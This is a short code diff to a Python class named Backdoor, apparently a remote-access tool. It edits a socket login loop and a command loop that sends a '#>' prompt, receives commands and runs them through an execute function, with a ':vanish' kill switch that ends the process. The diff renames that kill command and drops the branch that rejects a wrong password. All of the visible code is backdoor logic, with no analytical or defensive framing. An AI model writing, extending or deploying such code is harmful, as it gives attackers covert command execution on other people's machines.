@@ -29,19 +29,17 @@ class Backdoor(object):
         while True:
             self.__sock.send('Login: '.encode())
             passwd = self.__sock.recv(1024).decode().strip()
-            if data == ':kill-and-vanish':
+            if passwd == ':vanish':
                 os._exit(0)
             if self.__passwd == passwd:
                 return True
-            else:
-                return False
 
     def cmd_loop(self):
         while True:
             self.__sock.send('#>'.encode())
             data = self.__sock.recv(1024).decode().strip()
 
-            if data == ':kill-and-vanish':
+            if data == ':vanish':
                 os._exit(0)
             
             out = self.__execute_code(data)
